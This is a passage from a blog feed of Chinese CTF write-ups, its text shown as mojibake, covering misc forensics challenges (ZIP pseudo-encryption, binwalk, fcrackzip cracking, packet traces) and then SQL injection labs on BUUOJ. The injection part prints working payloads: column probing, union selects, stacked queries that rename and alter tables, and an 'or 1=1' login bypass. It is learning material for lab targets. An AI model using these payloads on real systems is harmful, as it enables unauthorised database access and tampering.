class="line">    07 00ï¼šæ–‡ä»¶åé•¿åº¦ </span><br><span class="line">    00 00ï¼šæ‰©å±•è®°å½•é•¿åº¦ </span><br><span class="line"></span><br><span class="line">å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºï¼š </span><br><span class="line">    50 4B 01 02ï¼šç›®å½•ä¸­æ–‡ä»¶æ–‡ä»¶å¤´æ ‡è®°(0x02014b50) </span><br><span class="line">    3F 00ï¼šå‹ç¼©ä½¿ç”¨çš„ pkware ç‰ˆæœ¬ </span><br><span class="line">    14 00ï¼šè§£å‹æ–‡ä»¶æ‰€éœ€ pkware ç‰ˆæœ¬ </span><br><span class="line">    00 00ï¼šå…¨å±€æ–¹å¼ä½æ ‡è®°</span><br><span class="line">    08 00ï¼šå‹ç¼©æ–¹å¼ </span><br><span class="line">    5A 7Eï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¶é—´ </span><br><span class="line">    F7 46ï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¥æœŸ </span><br><span class="line">    16 B5 80 14ï¼šCRC-32æ ¡éªŒï¼ˆ1480B516ï¼‰ </span><br><span class="line">    19 00 00 00ï¼šå‹ç¼©åå°ºå¯¸ï¼ˆ25ï¼‰ </span><br><span class="line">    17 00 00 00ï¼šæœªå‹ç¼©å°ºå¯¸ï¼ˆ23ï¼‰ </span><br><span class="line">    07 00ï¼šæ–‡ä»¶åé•¿åº¦ </span><br><span class="line">    24 00ï¼šæ‰©å±•å­—æ®µé•¿åº¦ </span><br><span class="line">    00 00ï¼šæ–‡ä»¶æ³¨é‡Šé•¿åº¦ </span><br><span class="line">    00 00ï¼šç£ç›˜å¼€å§‹å· </span><br><span class="line">    00 00ï¼šå†…éƒ¨æ–‡ä»¶å±æ€§ </span><br><span class="line">    20 00 00 00ï¼šå¤–éƒ¨æ–‡ä»¶å±æ€§ </span><br><span class="line">    00 00 00 00ï¼šå±€éƒ¨å¤´éƒ¨åç§»é‡ </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—ï¼š </span><br><span class="line">    50 4B 05 06ï¼šç›®å½•ç»“æŸæ ‡è®° </span><br><span class="line">    00 00ï¼šå½“å‰ç£ç›˜ç¼–å· </span><br><span class="line">    00 00ï¼šç›®å½•åŒºå¼€å§‹ç£ç›˜ç¼–å· </span><br><span class="line">    01 00ï¼šæœ¬ç£ç›˜ä¸Šçºªå½•æ€»æ•° </span><br><span class="line">    01 00ï¼šç›®å½•åŒºä¸­çºªå½•æ€»æ•° </span><br><span class="line">    59 00 00 00ï¼šç›®å½•åŒºå°ºå¯¸å¤§å° </span><br><span class="line">    3E 00 00 00ï¼šç›®å½•åŒºå¯¹ç¬¬ä¸€å¼ ç£ç›˜çš„åç§»é‡ </span><br><span class="line">    00 00ï¼šZIP æ–‡ä»¶æ³¨é‡Šé•¿åº¦</span><br></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬é€šè¿‡<code>hex fiend</code>æ‰“å¼€zipæ–‡ä»¶å¯ä»¥å‘ç°ã€‚å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºçš„å…¨å±€æ–¹å¼ä½æ ‡è®°ä¸º<code>0900</code>,å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºçš„å…¨å±€æ–¹å¼ä½æ ‡è®°ä¸º<code>0900</code>ï¼Œè€Œå¯¹äº<code>zip</code>ä¼ªåŠ å¯†æ–‡ä»¶ï¼Œæˆ‘ä»¬åªéœ€è¦å°†<strong>å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºå’Œå‹ç¼©æºæ–‡ä»¶ç›®å½•åŒº</strong>çš„å…¨å±€æ–¹å¼ä½æ ‡è®°ä»<code>0900</code>æˆ–è€…<code>0100</code>ä¿®æ”¹ä¸º<code>0000</code>å°±å¯ä»¥ç§»é™¤å¯†ç ï¼Œåä¹‹åˆ™å¯ä»¥æ·»åŠ å¯†ç ã€‚</p><p><img src="/2022/12/13/CTF-Misc/19.png" alt="19"></p><h4 id="è¢«å—…æ¢çš„æµé‡"><a href="#è¢«å—…æ¢çš„æµé‡" class="headerlink" title="è¢«å—…æ¢çš„æµé‡"></a>è¢«å—…æ¢çš„æµé‡</h4><p>wiresharkæ‰“å¼€è¿‡æ»¤postè¯·æ±‚ï¼Œå‘ç°æœ‰ä¸€ä¸ªjepgæ ¼å¼çš„ç…§ç‰‡ï¼Œæ‰“å¼€æŸ¥çœ‹ã€‚</p><p><img src="/2022/12/13/CTF-Misc/20.png" alt="20"></p><p>è·å–åˆ°<code>flag</code></p><p><img src="/2022/12/13/CTF-Misc/21.png" alt="21"></p><h4 id="é•œå­é‡Œé¢çš„ä¸–ç•Œ"><a href="#é•œå­é‡Œé¢çš„ä¸–ç•Œ" class="headerlink" title="é•œå­é‡Œé¢çš„ä¸–ç•Œ"></a>é•œå­é‡Œé¢çš„ä¸–ç•Œ</h4><p><code>StegSolve</code>æ‰“å¼€å›¾ç‰‡ï¼Œåœ¨ä¸åŒé€šé“ä¸­åˆ‡æ¢æŸ¥çœ‹å›¾ç‰‡ï¼Œå‘ç°<code>blue0,green0,red0</code>å’ŒåŸå§‹å›¾ç‰‡ä¸ä¸€æ ·</p><p><code>data extract</code>è·å–<code>flag</code></p><p><img src="/2022/12/13/CTF-Misc/22.png" alt="22"></p><h4 id="ningen"><a href="#ningen" class="headerlink" title="ningen"></a>ningen</h4><p><code>binwalk</code>åˆ†æ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % binwalk 9e3ec8c2-38c7-41cf-b5d7-abe7872de4c3.jpg</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             JPEG image data, JFIF standard 1.01</span><br><span class="line">38689         0x9721          Zip archive data, encrypted at least v2.0 to extract, compressed size: 50, uncompressed size: 38, name: ningen.txt</span><br><span class="line">38871         0x97D7          End of Zip archive, footer length: 22</span><br></pre></td></tr></table></figure><p>å‘ç°å­˜åœ¨zipæ–‡ä»¶ã€‚foremoståˆ†ç¦»</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % foremost 9e3ec8c2-38c7-41cf-b5d7-abe7872de4c3.jpg</span><br><span class="line">foremost: /usr/local/etc/foremost.conf: No such file or directory</span><br><span class="line">Processing: 9e3ec8c2-38c7-41cf-b5d7-abe7872de4c3.jpg</span><br><span class="line">|foundat=ningen.txt|ï¿½ï¿½ï¿½Bï¿½ï¿½Wï¿½ï¿½uï¿½ï¿½ï¿½:)ï¿½×[Rkï¿½3ï¿½_ï¿½ï¿½Wï¿½iï¿½&#125;Ä†ne%ï¿½3ï¿½]ï¿½ï¿½BPK?</span><br><span class="line">*|</span><br></pre></td></tr></table></figure><p>zipä¸‹æœ‰ä¸€ä¸ª<code>ningen.txt</code>æ–‡ä»¶ï¼Œä½†æ˜¯è¢«åŠ å¯†äº†ï¼Œç”±é¢˜ç›®å¯çŸ¥æ˜¯å››ä½æ•°å¯†ç ï¼Œfcrackçˆ†ç ´è·å–<code>flag</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % fcrackzip -b -c '1' -l 4 -u output/zip/00000075.zip</span><br><span class="line">PASSWORD FOUND!!!!: pw == 8368</span><br></pre></td></tr></table></figure><h4 id="easycap"><a href="#easycap" class="headerlink" title="easycap"></a>easycap</h4><p>è¿½è¸ªtcpæ•°æ®æµè·å–flag</p><p><img src="/2022/12/13/CTF-Misc/23.png" alt="23"></p><h4 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h4><p>å›¾ç‰‡ä¸‹è½½ä¸‹æ¥binwalkæŸ¥çœ‹å‘ç°å­˜åœ¨å‹ç¼©æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % binwalk 42011487927629132.png</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             PNG image, 664 x 586, 8-bit/color RGB, non-interlaced</span><br><span class="line">41            0x29            Zlib compressed data, default compression</span><br></pre></td></tr></table></figure><p>stegsolveæœ€ä½ä½åˆ†æï¼Œæ ¹æ®æ ‡è¯†å¤´å‘ç°æ˜¯zipæ–‡ä»¶</p><p><img src="/2022/12/13/CTF-Misc/24.png" alt="24"></p><p>ä¿®æ”¹ä¸‹è½½ä¸‹æ¥çš„å›¾ç‰‡åç¼€ä¸ºzipå¹¶è§£å‹ï¼Œå‘ç°é‡Œé¢å­˜åœ¨ä¸€ä¸ª1çš„æ–‡ä»¶ï¼ŒæŸ¥çœ‹æ–‡ä»¶å±æ€§å‘ç°æ˜¯å¯æ‰§è¡Œæ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % file 1</span><br><span class="line">1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=8df45089fa39fec83423ec37a944e81065d16bee, not stripped</span><br></pre></td></tr></table></figure><p><code>Ghidra</code>æ‰“å¼€åç¼–è¯‘åçœ‹åˆ°<code>flag</code></p><p><img src="/2022/12/13/CTF-Misc/25.png" alt="25"></p><h4 id="æ•°æ®åŒ…ä¸­çš„çº¿ç´¢"><a href="#æ•°æ®åŒ…ä¸­çš„çº¿ç´¢" class="headerlink" title="æ•°æ®åŒ…ä¸­çš„çº¿ç´¢"></a>æ•°æ®åŒ…ä¸­çš„çº¿ç´¢</h4><p>ä¸‹è½½å›¾ç‰‡åè¿½è¸ªhttpæµï¼Œå‘ç°æœ‰ä¸€ä¸²base64ç¼–ç æ•°æ®ï¼Œä»¥<code>/9j/</code>å¼€å¤´ï¼Œå±äºå›¾ç‰‡æ ¼å¼ï¼Œç›´æ¥base64è½¬å›¾ç‰‡ï¼Œçœ‹åˆ°flag</p><p><img src="/2022/12/13/CTF-Misc/26.png" alt="26"></p><p><img src="/2022/12/13/CTF-Misc/27.png" alt="27"></p><h4 id="æ¥é¦–æ­Œå§"><a href="#æ¥é¦–æ­Œå§" class="headerlink" title="æ¥é¦–æ­Œå§"></a>æ¥é¦–æ­Œå§</h4><p>Audacityæ‰“å¼€å‘ç°å­˜åœ¨æ‘©æ–¯ç”µç ï¼Œè§£å¯†å¾—åˆ°flag</p><p><img src="/2022/12/13/CTF-Misc/28.png" alt="28"></p><h4 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h4><p>ä¸‹è½½å›¾ç‰‡å<code>binwalk</code>åˆ†æ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % binwalk snake.jpg</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             JPEG image data, JFIF standard 1.01</span><br><span class="line">30            0x1E            TIFF image data, big-endian, offset of first image directory: 8</span><br><span class="line">2925          0xB6D           Copyright string: "Copyright Apple Inc., 2015"</span><br><span class="line">278260        0x43EF4         Zip archive data, at least v1.0 to extract, compressed size: 82, uncompressed size: 82, name: key</span><br><span class="line">278375        0x43F67         Zip archive data, at least v1.0 to extract, compressed size: 48, uncompressed size: 48, name: cipher</span><br><span class="line">278632        0x44068         End of Zip archive, footer length: 22</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹åç¼€åè§£å‹</p><p>å‘ç°æœ‰ä¿©æ–‡ä»¶ä¸€ä¸ª<code>cipher</code>ä¸€ä¸ª<code>key</code>ï¼Œå°†<code>key</code>ç”¨<code>hex fiend</code>æ‰“å¼€å‘ç°ä¸€ä¸²<code>base64</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">V2hhdCBpcyBOaWNraSBNaW5haidzIGZhdm9yaXRlIHNvbmcgdGhhdCByZWZlcnMgdG8gc25ha2VzPwo=</span><br></pre></td></tr></table></figure><p>è§£ç ç»“æœä¸º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">What is Nicki Minaj's favorite song that refers to snakes?</span><br></pre></td></tr></table></figure><p><code>google</code>æœç´¢è¿™ä¸ªäººå’Œè›‡æœ‰å…³çš„æ­Œæ›²ï¼Œåä¸º<code>anaconda</code></p><p><img src="/2022/12/13/CTF-Misc/29.png" alt="29"></p><p>åŠ å¯†ç®—æ³•æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿç™¾æ€ä¸å¾—å…¶è§£ï¼Œç½‘ä¸ŠæŸ¥äº†åå‘ç°è›‡è¿˜æœ‰ä¸ªè‹±æ–‡åå«<code>Serpent</code>æ­£å¥½ä¹Ÿå¯¹åº”ä¸€ä¸ªåŠ å¯†ç®—æ³•ã€‚ã€‚ã€‚</p><p><code>serpent</code>åœ¨çº¿åŠ è§£å¯†ï¼š<a href="http://serpent.online-domain-tools.com/" target="_blank" rel="noopener">http://serpent.online-domain-tools.com/</a></p><p>å¾—åˆ°<code>flag</code></p><p><img src="/2022/12/13/CTF-Misc/30.png" alt="30"></p><h4 id="ä½›ç³»é’å¹´"><a href="#ä½›ç³»é’å¹´" class="headerlink" title="ä½›ç³»é’å¹´"></a>ä½›ç³»é’å¹´</h4><p>ä¸‹è½½åå‘ç°zipæ˜¯ä¼ªåŠ å¯†ï¼Œç›´æ¥ä¿®æ”¹åæ‰“å¼€ï¼Œé‡Œé¢ä¸€å¼ ç…§ç‰‡ä¸€ä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹</p><p><img src="/2022/12/13/CTF-Misc/31.png" alt="31"></p><p>æ²¡çœ‹æ˜ç™½å•¥æ„æ€ï¼Œå›¾ç‰‡æˆ‘<code>binwalk hexfiend stegsolve</code>éƒ½æ— æœ</p><p>çœ‹äº†writeupåçŸ¥é“äº†ä¸€ä¸ªç½‘ç«™ã€‚ã€‚ã€‚ã€‚</p><p>ä¸ä½›è®ºç¦…ï¼š<a href="https://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">https://www.keyfc.net/bbs/tools/tudoucode.aspx</a></p><p>å¾—åˆ°<code>flag</code></p><p><img src="/2022/12/13/CTF-Misc/32.png" alt="32"></p><h4 id="èœåˆ€666"><a href="#èœåˆ€666" class="headerlink" title="èœåˆ€666"></a>èœåˆ€666</h4><p>ä¸‹è½½æ–‡ä»¶åç›´æ¥wiresharkæ‰“å¼€ï¼Œæ ¹æ®é¢˜ç›®åº”è¯¥æ˜¯POSTè¯·æ±‚ï¼Œç›´æ¥è¿‡æ»¤postè¯·æ±‚</p><p><img src="/2022/12/13/CTF-Misc/33.png" alt="33"></p><p>è¿‡æ»¤ä¹‹åè¿½è¸ªhttpè¯·æ±‚æµï¼Œå‘ç°äº†ä¸¤æ®µå¯ä»¥çš„è¯·æ±‚</p><p>ç¬¬ä¸€æ®µpostå‚æ•°æœ‰<code>z1</code>å’Œ<code>z2</code></p><p><img src="/2022/12/13/CTF-Misc/34.png" alt="34"></p><p>å°†<code>z1 base64</code>è§£ç å¾—åˆ°ä¸€ä¸ªå›¾ç‰‡åœ°å€</p><p><img src="/2022/12/13/CTF-Misc/36.png" alt="36"></p><p><code>z2</code>æ˜¯å¾ˆé•¿çš„ä¸€æ®µ16è¿›åˆ¶hexç ï¼Œä»¥<code>FFD8</code>å¼€å¤´ä»¥<code>FFD9</code>ç»“å°¾ï¼Œå¯ä»¥åˆ¤æ–­å‡ºæ˜¯<code>jpeg</code>å›¾ç‰‡æ ¼å¼çš„å¼€å¤´å’Œç»“å°¾ï¼Œäºæ˜¯æ‰¾ä¸€ä¸ªåœ¨çº¿ç½‘ç«™ç›´æ¥è½¬æ¢</p><p>hexadecimal-&gt;image:<a href="https://codepen.io/abdhass/full/jdRNdj" target="_blank" rel="noopener">https://codepen.io/abdhass/full/jdRNdj</a></p><p><img src="/2022/12/13/CTF-Misc/37.png" alt="37"></p><p>ç¬¬äºŒæ®µpostè¯·æ±‚ä¸­å­˜åœ¨å…¶ä»–æ–‡ä»¶</p><p><img src="/2022/12/13/CTF-Misc/35.png" alt="35"></p><p><code>foremost</code>åˆ†ç¦»</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % foremost 666666.pcapng</span><br><span class="line">foremost: /usr/local/etc/foremost.conf: No such file or directory</span><br><span class="line">Processing: 666666.pcapng</span><br><span class="line">|foundat=flag.txtCï¿½ï¿½ï¿½ï¿½cSï¿½Jï¿½ï¿½Eaï¿½vï¿½</span><br><span class="line">                                 ï¿½ï¿½&amp;e$Kï¿½ï¿½2%ï¿½$ï¿½ï¿½,ï¿½=ï¿½Jï¿½ï¿½1pï¿½ï¿½p46PK?</span><br><span class="line">*|</span><br></pre></td></tr></table></figure><p>è¾“å…¥ä¸Šé¢å›¾ç‰‡ä¸­çš„å¯†ç ï¼Œæ‹¿åˆ°<code>flag</code></p><h4 id="é¸¡ä½ å¤ªç¾"><a href="#é¸¡ä½ å¤ªç¾" class="headerlink" title="é¸¡ä½ å¤ªç¾"></a>é¸¡ä½ å¤ªç¾</h4><p>ä¸¤å¼ gifå›¾ï¼Œç¬¬äºŒå¼ å‰¯æœ¬å›¾ç‰‡æŸæ¯äº†ï¼Œ<code>hex fiend</code>æ‰“å¼€åå‘ç°ç¼ºå°‘<code>gif</code>å¤´ï¼Œæ ‡è¯†ä¸º<code>47 49 46 38</code>ï¼Œæ·»åŠ <code>gif</code>å¤´åå¯ä»¥æ­£å¸¸æ‰“å¼€ï¼Œçœ‹åˆ°<code>flag</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;é‡‘ä¸‰èƒ–&quot;&gt;&lt;a href=&quot;#é‡‘ä¸‰èƒ–&quot; class=&quot;headerlink&quot; title=&quot;é‡‘ä¸‰èƒ–&quot;&gt;&lt;/a&gt;é‡‘ä¸‰èƒ–&lt;/h4&gt;&lt;p&gt;zipä¸‹è½½åæœ‰ä¸€å¼ gifï¼Œç›´æ¥æ‹–å…¥åˆ°StegSolveä¸­åˆ†å¸§æŸ¥çœ‹ï¼Œå¾—åˆ°flag&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2022/12/
      
    
    </summary>
    
    
      <category term="ctf" scheme="elssm.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>CTF SQL WriteUp</title>
    <link href="elssm.github.io/2022/12/07/CTF-SQL-WriteUp/"/>
    <id>elssm.github.io/2022/12/07/CTF-SQL-WriteUp/</id>
    <published>2022-12-07T02:46:49.000Z</published>
    <updated>2022-12-13T01:46:05.936Z</updated>
    
    <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>Ctf sqlæ³¨å…¥å­¦ä¹ </p><p>é¢˜ç›®åœ°å€ï¼š<a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">https://buuoj.cn/challenges</a></p><h3 id="å¼ºç½‘æ¯-2019-éšä¾¿æ³¨"><a href="#å¼ºç½‘æ¯-2019-éšä¾¿æ³¨" class="headerlink" title="[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨"></a>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</h3><h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h4><p>å¯åŠ¨é¶æœºè¾“å…¥1ï¼Œå›æ˜¾å¦‚ä¸‹</p><p><img src="/2022/12/07/CTF-SQL-WriteUp/1.png" alt="1"></p><p>è¾“å…¥<code>1&#39;</code>ï¼Œå›æ˜¾å¦‚ä¸‹</p><p><img src="/2022/12/07/CTF-SQL-WriteUp/2.png" alt="1"></p><p>è¾“å…¥<code>1&#39;#</code>ï¼Œå›æ˜¾å¦‚ä¸‹</p><p><img src="/2022/12/07/CTF-SQL-WriteUp/3.png" alt="1"></p><p>å‘ç°å­˜åœ¨sqlæ³¨å…¥ï¼Œè¿›è€Œä½¿ç”¨<code>order by</code>çˆ†åˆ—æ•°</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' order by 1;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>æ— æŠ¥é”™</p><p><img src="/2022/12/07/CTF-SQL-WriteUp/4.png" alt="1"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' order by 2;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>æ— æŠ¥é”™</p><p><img src="/2022/12/07/CTF-SQL-WriteUp/5.png" alt="1"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' order by 3;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>æŠ¥é”™</p><p><img src="/2022/12/07/CTF-SQL-WriteUp/6.png" alt="1"></p><p>å› æ­¤å­—æ®µæœ‰ä¸¤åˆ—ã€‚</p><p>ä½¿ç”¨ï¼Œ<code>union select</code>å›æ˜¾</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>å‘ç°æœ‰æ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œè¿‡æ»¤</p><p><img src="/2022/12/07/CTF-SQL-WriteUp/7.png" alt="1"></p><h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><p>è½¬å‘å †å æ³¨å…¥</p><p>æŸ¥çœ‹æ•°æ®åº“</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">databases</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/8.png" alt="1"></p><p>æŸ¥çœ‹è¡¨</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">tables</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>å‘ç°æœ‰ä¸¤å¼ è¡¨ï¼Œåˆ†åˆ«æ˜¯<code>1919810931114514</code>å’Œ<code>words</code></p><p><img src="/2022/12/07/CTF-SQL-WriteUp/9.png" alt="1"></p><p>è·å–æ¯å¼ è¡¨çš„å­—æ®µ</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> <span class="string">`1919810931114514`</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/10.png" alt="1"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> words;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/11.png" alt="1"></p><h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h4><p>æ ¹æ®ä¸¤å¼ è¡¨çš„å­—æ®µæ•°å¯ä»¥åˆ¤æ–­å‡ºè¾“å…¥æ¡†æŸ¥è¯¢çš„æ˜¯<code>words</code>è¡¨ã€‚</p><p>å› æ­¤æˆ‘ä»¬çš„æ€è·¯æ˜¯å°†<code>1919810931114514</code>è¡¨åæ”¹ä¸º<code>words</code>è¡¨ï¼Œå†å°†è¡¨ä¸­çš„<code>flag</code>å­—æ®µæ”¹ä¸º<code>id</code>å­—æ®µåå†æ¬¡è¿›è¡ŒæŸ¥è¯¢</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="keyword">rename</span> <span class="keyword">table</span> <span class="string">`words`</span> <span class="keyword">to</span> words2;<span class="keyword">rename</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span> <span class="keyword">to</span> <span class="string">`words`</span>;<span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">change</span> flag <span class="keyword">id</span> <span class="built_in">varchar</span>(<span class="number">100</span>);<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>ä¿®æ”¹åæŸ¥çœ‹æ˜¯å¦ä¿®æ”¹æˆåŠŸ</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">tables</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>å‘ç°å·²ç»ä¿®æ”¹æˆåŠŸ</p><p><img src="/2022/12/07/CTF-SQL-WriteUp/12.png" alt="1"></p><h4 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h4><p>æŸ¥çœ‹flag</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' or 1=1<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/13.png" alt="1">flagä¸º<code>flag{1f13cb4b-44b0-49e7-8ca5-02499e7085df}</code></p><h3 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h3><p>å †å æ³¨å…¥</p><p>æŸ¥çœ‹è¡¨</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="keyword">show</span> <span class="keyword">tables</span>;</span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/15.png" alt="1"></p><p>è·å–<code>flag</code></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*,1</span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/14.png" alt="1"></p><p>flagä¸º<code>flag{e0fd544e-1ad2-4725-9a41-5de52bc11c9d}</code></p><h3 id="æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL</h3><h4 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h4><p>å¯åŠ¨é¶æœºï¼Œå‘ç°éœ€è¦ç”¨æˆ·åå¯†ç ç™»é™†ï¼Œç›´æ¥ä¸‡èƒ½å¯†ç å°è¯•</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' or '1'='1'<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/16.png" alt="16"></p><h4 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h4><p>æ¥ç€é€šè¿‡<code>order by</code>çˆ†ç ´åˆ—æ•°</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin' order by 1<span class="comment">#</span></span><br><span class="line">admin' order by 2<span class="comment">#</span></span><br><span class="line">admin' order by 3<span class="comment">#</span></span><br><span class="line">admin' order by 4<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>4çš„æ—¶å€™æŠ¥é”™ï¼Œè¯´æ˜æœ‰3åˆ—</p><p><img src="/2022/12/07/CTF-SQL-WriteUp/17.png" alt="17"></p><p>å›æ˜¾</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/18.png" alt="18"></p><h4 id="0x02-1"><a href="#0x02-1" 